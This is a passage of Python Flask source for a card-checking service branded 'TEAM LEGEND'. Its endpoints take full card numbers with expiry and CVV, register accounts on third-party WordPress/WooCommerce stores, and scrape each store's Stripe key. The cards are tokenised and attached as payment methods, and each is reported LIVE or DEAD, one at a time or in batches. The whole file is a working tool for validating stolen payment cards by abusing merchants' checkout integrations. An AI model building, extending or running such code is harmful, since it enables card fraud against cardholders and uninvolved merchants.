            complete_job(job_id, {
                'status': 'DEAD',
                'message': 'Site is not WordPress/WooCommerce compatible',
                'time_taken': round(time.time() - start_time, 2)
            })
            return
        
        update_job_progress(job_id, 'Site Detection', 'success', 'WordPress/WooCommerce detected ✓')
        
        # Step 2: Stripe Key Extraction
        update_job_progress(job_id, 'Stripe Key Extraction', 'processing', 'Extracting Stripe public key...')
        
        stripe_key = detector.extract_stripe_key()
        
        if not stripe_key:
            update_job_progress(job_id, 'Stripe Key Extraction', 'failed', 'No Stripe key found on site')
            complete_job(job_id, {
                'status': 'DEAD',
                'message': 'Stripe integration not found on this site',
                'time_taken': round(time.time() - start_time, 2)
            })
            return
        
        update_job_progress(job_id, 'Stripe Key Extraction', 'success', f'Stripe key found: {stripe_key[:15]}...')
        
        # Step 3: Account Registration
        update_job_progress(job_id, 'Account Registration', 'processing', 'Registering new account...')
        
        reg_success, session, ajax_nonce, reg_msg = register_account_dynamic(site)
        
        if not reg_success:
            update_job_progress(job_id, 'Account Registration', 'failed', f'Registration failed: {reg_msg}')
            complete_job(job_id, {
                'status': 'DEAD',
                'message': f'Account registration failed: {reg_msg}',
                'time_taken': round(time.time() - start_time, 2)
            })
            return
        
        update_job_progress(job_id, 'Account Registration', 'success', 'Account created successfully')
        
        # Step 4: Stripe Token
        update_job_progress(job_id, 'Stripe Token', 'processing', 'Generating Stripe payment token...')
        
        pm_status, pm_token = get_stripe_payment_token(cc, stripe_key)
        
        if pm_status != 'SUCCESS':
            update_job_progress(job_id, 'Stripe Token', 'failed', pm_token)
            complete_job(job_id, {
                'status': 'DEAD',
                'message': pm_token,
                'time_taken': round(time.time() - start_time, 2)
            })
            return
        
        update_job_progress(job_id, 'Stripe Token', 'success', f'Token received: {pm_token[:20]}...')
        
        # Step 5: Payment Method
        update_job_progress(job_id, 'Payment Method', 'processing', 'Adding payment method to account...')
        
        website_status, website_msg = add_card_to_website_dynamic(pm_token, session, ajax_nonce, site)
        
        status_type = 'success' if website_status in ['LIVE', '3D_REQUIRED'] else ('warning' if website_status == 'RATE_LIMIT' else 'failed')
        update_job_progress(job_id, 'Payment Method', status_type, website_msg)
        
        # Complete job
        complete_job(job_id, {
            'status': website_status,
            'site': site,
            'stripe_key': stripe_key,
            'message': website_msg,
            'time_taken': round(time.time() - start_time, 2)
        })
        
    except Exception as e:
        logging.error(f"Background job {job_id} failed: {e}")
        update_job_progress(job_id, 'Error', 'failed', str(e))
        complete_job(job_id, {
            'status': 'DEAD',
            'message': f'Error: {str(e)}',
            'time_taken': 0
        })


@app.route('/key-<api_key>/site=<path:site>/check/start', methods=['GET'])
def start_check_card(api_key, site):
    """Start async card check and return job ID"""
    if api_key != '@teamlegendno1':
        return jsonify({'status': 'error', 'message': 'Invalid API key'}), 401
    
    cc = request.args.get('cc', '')
    if not cc:
        return jsonify({'status': 'error', 'message': 'CC parameter required'}), 400
    
    # Generate job ID
    job_id = str(uuid.uuid4())
    
    # Start background job
    executor.submit(background_check_card, job_id, api_key, site, cc)
    
    return jsonify({
        'status': 'started',
        'job_id': job_id,
        'message': 'Card check started in background'
    })


@app.route('/check/status/<job_id>', methods=['GET'])
def get_check_status(job_id):
    """Get real-time status of card check"""
    job_data = get_job_status(job_id)
    
    if not job_data:
        return jsonify({'status': 'error', 'message': 'Job not found'}), 404
    
    return jsonify({
        'job_id': job_id,
        'status': job_data['status'],
        'steps': job_data['steps'],
        'result': job_data.get('result'),
        'elapsed_time': round(time.time() - job_data['start_time'], 2)
    })


@app.route('/key-<api_key>/site=<path:site>/fast', methods=['GET'])
def fast_check_card(api_key, site):
    """Fast card check using cached session (1-6 sec response)"""
    
    if api_key != '@teamlegendno1':
        return jsonify({'status': 'error', 'message': 'Invalid API key'}), 401
    
    cc = request.args.get('cc', '')
    if not cc:
        return jsonify({'status': 'error', 'message': 'CC parameter required'}), 400
    
    start_time = time.time()
    
    try:
        card_parts = cc.split('|')
        card_display = cc  # Show full card
    except:
        card_display = cc
    
    session, ajax_nonce, stripe_key = get_cached_session(site)
    
    if not session or not ajax_nonce or not stripe_key:
        logging.info(f"❌ No cache for {site}, initializing...")
        
        detector = SiteDetector(site)
        is_wp = detector.detect_wordpress()
        is_wc = detector.detect_woocommerce()
        
        if not is_wp or not is_wc:
            return jsonify({
                'CC': card_display,
                'Status': 'DEAD',
                'Response': 'Not a WordPress/WooCommerce site',
                'Cached': False,
                'Time': round(time.time() - start_time, 2),
                'Owner': 'Aditya 🇮🇳'
            })
        
        stripe_key = detector.extract_stripe_key()
        if not stripe_key:
            return jsonify({
                'CC': card_display,
                'Status': 'DEAD',
                'Response': 'Stripe key not found',
                'Cached': False,
                'Time': round(time.time() - start_time, 2),
                'Owner': 'Aditya 🇮🇳'
            })
        
        reg_success, session, ajax_nonce, reg_msg = register_account_dynamic(site)
        if not reg_success:
            return jsonify({
                'CC': card_display,
                'Status': 'DEAD',
                'Response': 'Registration failed',
                'Cached': False,
                'Time': round(time.time() - start_time, 2),
                'Owner': 'Aditya 🇮🇳'
            })
        
        cache_session(site, session, ajax_nonce, stripe_key)
        logging.info(f"✅ Initialized cache for {site}")
    
    token_status, pm_token = get_stripe_payment_token(cc, stripe_key)
    
    if token_status == 'DEAD':
        return jsonify({
            'CC': card_display,
            'Status': 'DEAD',
            'Response': pm_token,
            'Cached': True,
            'Time': round(time.time() - start_time, 2),
            'Owner': 'Aditya 🇮🇳'
        })
    
    website_status, website_msg = add_card_to_website_dynamic(pm_token, session, ajax_nonce, site)
    
    if website_status == 'DEAD' and 'nonce' in website_msg.lower():
        logging.warning(f"⚠️ Session expired for {site}, refreshing...")
        invalidate_cache(site)
        
        reg_success, session, ajax_nonce, reg_msg = register_account_dynamic(site)
        if reg_success:
            cache_session(site, session, ajax_nonce, stripe_key)
            website_status, website_msg = add_card_to_website_dynamic(pm_token, session, ajax_nonce, site)
        else:
            return jsonify({
                'CC': card_display,
                'Status': 'DEAD',
                'Response': 'Session refresh failed',
                'Cached': False,
                'Time': round(time.time() - start_time, 2),
                'Owner': 'Aditya 🇮🇳'
            })
    
    return json_response(OrderedDict([
        ('CC', card_display),
        ('Status', website_status),
        ('Response', website_msg),
        ('Cached', True),
        ('Time', round(time.time() - start_time, 2)),
        ('Dev', 'ADITYA X ⚡TEAM LEGEND')
    ]))


@app.route('/key-<api_key>/site=<path:site>/batch', methods=['POST'])
def batch_check_cards(api_key, site):
    """Batch check multiple cards using cached session (super fast)"""
    
    if api_key != '@teamlegendno1':
        return jsonify({'status': 'error', 'message': 'Invalid API key'}), 401
    
    data = request.get_json()
    if not data or 'cards' not in data:
        return jsonify({'status': 'error', 'message': 'Cards array required in JSON body'}), 400
    
    cards = data['cards']
    if not isinstance(cards, list) or len(cards) == 0:
        return jsonify({'status': 'error', 'message': 'Cards must be a non-empty array'}), 400
    
    start_time = time.time()
    results = []
    
    session, ajax_nonce, stripe_key = get_cached_session(site)
    
    if not session or not ajax_nonce or not stripe_key:
        logging.info(f"🔄 Initializing session for batch check on {site}")
        
        detector = SiteDetector(site)
        is_wp = detector.detect_wordpress()
        is_wc = detector.detect_woocommerce()
        
        if not is_wp or not is_wc:
            return jsonify({
                'status': 'error',
                'message': 'Not a WordPress/WooCommerce site',
                'site': site,
                'results': []
            })
        
        stripe_key = detector.extract_stripe_key()
        if not stripe_key:
            return jsonify({
                'status': 'error',
                'message': 'Stripe key not found',
                'site': site,
                'results': []
            })
        
        reg_success, session, ajax_nonce, reg_msg = register_account_dynamic(site)
        if not reg_success:
            return jsonify({
                'status': 'error',
                'message': f'Registration failed: {reg_msg}',
                'site': site,
                'results': []
            })
        
        cache_session(site, session, ajax_nonce, stripe_key)
    
    for idx, cc in enumerate(cards):
        card_start = time.time()
        
        try:
            card_parts = cc.split('|')
            card_display = cc  # Show full card
        except:
            results.append({
                'card': cc,
                'status': 'DEAD',
                'message': 'Invalid card format',
                'time_taken': 0
            })
            continue
        
        token_status, pm_token = get_stripe_payment_token(cc, stripe_key)
        
        if token_status == 'DEAD':
            results.append({
                'card': card_display,
                'status': 'DEAD',
                'message': pm_token,
                'time_taken': round(time.time() - card_start, 2)
            })
            continue
        
        website_status, website_msg = add_card_to_website_dynamic(pm_token, session, ajax_nonce, site)
        
        if website_status == 'DEAD' and 'nonce' in website_msg.lower():
            logging.warning(f"⚠️ Session expired, refreshing...")
            invalidate_cache(site)
            
            reg_success, session, ajax_nonce, reg_msg = register_account_dynamic(site)
            if reg_success:
                cache_session(site, session, ajax_nonce, stripe_key)
                website_status, website_msg = add_card_to_website_dynamic(pm_token, session, ajax_nonce, site)
        
        results.append({
            'card': card_display,
            'full_card': cc,
            'status': website_status,
            'message': website_msg,
            'time_taken': round(time.time() - card_start, 2)
        })
    
    return jsonify({
        'status': 'success',
        'site': site,
        'total_cards': len(cards),
        'results': results,
        'total_time': round(time.time() - start_time, 2),
        'avg_time_per_card': round((time.time() - start_time) / len(cards), 2)
    })


@app.route('/key-<api_key>/site=<path:site>/clear-cache', methods=['POST'])
def clear_site_cache(api_key, site):
    """Clear cached session for a site"""
    
    if api_key != '@teamlegendno1':
        return jsonify({'status': 'error', 'message': 'Invalid API key'}), 401
    
    invalidate_cache(site)
    
    return jsonify({
        'status': 'success',
        'message': f'Cache cleared for {site}'
    })


@app.route('/', methods=['GET'])
def home():
    """API documentation."""
    return jsonify({
        'message': 'Api endpoint!',
        'endpoint': '/key-@teamlegendno1/gate-chk/cc=CARD|MM|YY|CVV&site=DOMAIN',
        'note': 'Use working clean site "/my-account/payment-method"',
        'performance': {
            'first_request': '1-40 sec',
            'second_request': '1-10 sec [cookie based]'
        }
    })


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
